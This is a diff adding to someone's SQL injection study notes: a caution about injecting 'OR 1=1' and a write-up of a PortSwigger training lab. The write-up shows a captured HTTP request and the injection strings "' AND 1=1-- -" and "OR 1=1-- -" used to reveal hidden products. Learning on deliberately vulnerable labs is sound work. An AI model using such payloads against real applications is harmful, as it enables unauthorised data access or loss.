@@ -61,6 +61,74 @@ Used when no errors are returned. The attacker infers information based on the a
 	- In `SELECT` statements, within the table or column name.
 	- In `SELECT` statements, within the `ORDER BY` clause.
 
+!!! warning "Caution using `OR 1=1`"
+
+	Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.
+
+??? example "PortSwigger SQL Injection Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
+
+	**Instructions**
+	
+	To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
+	
+	**Exploit**
+	
+	On this shopping site, we can filter by category. For example, when "accessories" is selected, only three items are shown. 
+	
+	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803065121.png)
+	
+	The following request and response show this:
+	
+	```
+	GET /filter?category=Accessories HTTP/1.1
+	Host: 0a8000b80463b54380fff8a8001500cc.web-security-academy.net
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate, br, zstd
+	Connection: keep-alive
+	Referer: https://0a8000b80463b54380fff8a8001500cc.web-security-academy.net/filter?category=Tech+gifts
+	Cookie: session=xcf9s6nU2m49EDeOXGJhsUF1dYJzO1uK
+	Upgrade-Insecure-Requests: 1
+	Sec-Fetch-Dest: document
+	Sec-Fetch-Mode: navigate
+	Sec-Fetch-Site: same-origin
+	Sec-Fetch-User: ?1
+	X-PwnFox-Color: magenta
+	Priority: u=0, i
+	
+	
+	```
+	
+	
+	```
+	HTTP/1.1 200 OK
+	Content-Type: text/html; charset=utf-8
+	X-Frame-Options: SAMEORIGIN
+	Connection: close
+	Content-Length: 4789
+	
+	[...SNIP...]
+	```
+	
+	Note the content length of 4789. When a single quote character is added, the server complains. 
+	
+	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803065507.png)
+	
+	Notice that if we add a second single quote, the applications calms down again and doesn't return an internal error. To view unreleased items, I used the following string:
+	
+	```
+	' AND 1=1-- -
+	```
+	
+	This shows the awesome and unreleased six-pack beer belt, which is a fantastic idea...btw!
+	
+	![](../../../../assets/screenshots/sqli/Pasted%20image%2020250803070133.png)
+	
+	Note that the official solution uses `OR 1=1-- -`, but this seemed to have worked for me. 
+
+
+
 ---
 
 ## Exploitation Techniques
